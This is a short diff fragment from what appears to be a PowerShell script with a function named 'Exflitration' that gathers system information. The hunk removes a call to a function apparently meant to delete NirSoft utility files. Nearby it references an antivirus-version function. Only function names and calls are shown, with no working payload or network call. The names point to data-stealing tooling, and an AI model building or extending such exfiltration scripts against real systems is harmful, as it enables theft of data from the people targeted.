@@ -52,9 +52,6 @@ function Exflitration {
 
     # Call SysInfo function
     SysInfo
-
-    # Call the Del-Nirsoft-File function
-    Del-Nirsoft-File
 }
 
     function version-av {
